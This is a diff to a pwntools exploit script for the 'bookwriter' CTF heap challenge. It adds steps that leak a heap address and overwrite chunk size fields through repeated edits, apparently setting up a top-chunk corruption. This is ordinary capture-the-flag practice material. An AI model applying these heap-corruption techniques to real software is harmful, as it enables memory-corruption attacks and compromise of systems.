@@ -11,7 +11,7 @@ context.log_level="debug"
 pwn_file="./bookwriter"
 libc_address=0
 heap_address=0
-libc=ELF("/dbg64/lib/libc.so.6")
+# libc=ELF("/dbg64/lib/libc.so.6")
 if len(sys.argv)==1:
     conn=process(pwn_file)
     pid=conn.pid
@@ -57,13 +57,20 @@ def edit(index,name):
     conn.sendafter("Content:",name)
 
 login("a"*0x40)
-# No.0
-add(0xc08,"a")
-edit(0,0xc08*"a")
-edit(0,0xc08*"a"+p64(0x03f1)[:3])
-# No.1
-add(0xc08,"a")
-edit(0,0xc08*"a")
+add(0x300,"a"*0x300)# 0
+heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x10
+add(0x308,"a"*0x308)# 1
+edit(1,"a"*0x308)
+edit(1,"a"*0x308+p64(0x109d1)[:3])
+add(0x10a00,"a")#2
+edit(1,"a"*0x308+p64(0x32001)[:3])
+add(0x1f000,"a")#3
+add(0x10000,"a")#4
+
+add(0x3000,"a"*0x1a08)#5
 debug()
-edit(0,0xc08*"a"+p64(0x3f1)[:3])
+edit(5,"a"*0x1a08)
+edit(5,"a"*0x1a08+p64(0xbe1)[:2])
+add(0x2000,"a")
+debug()
 conn.interactive()
